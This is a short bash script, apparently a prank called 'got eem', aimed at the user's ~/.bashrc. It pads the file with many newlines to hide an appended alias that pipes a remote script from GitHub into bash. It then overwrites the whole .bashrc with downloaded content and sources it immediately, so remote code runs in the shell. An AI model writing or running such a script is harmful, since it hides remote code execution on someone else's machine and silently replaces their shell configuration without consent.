#!/usr/bin/env bash

#local_bash_directory="./out"
local_bash_directory=($HOME)
bashrc_file="$local_bash_directory/.bashrc"
bashrc_file_old="$local_bash_directory/.theoldbashrc"

command="curl -Ls https://raw.githubusercontent.com/jackall3n/got-eem/master/got-eem.sh | bash"

printf "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nalias goteem='$command'" >> ${bashrc_file}

cp ${bashrc_file} ${bashrc_file_old}

bash_contents=$(curl -Ls https://raw.githubusercontent.com/jackall3n/got-eem/master/.bashrc)

echo "$bash_contents" > ${bashrc_file}

source ${bashrc_file}

echo "got eem"
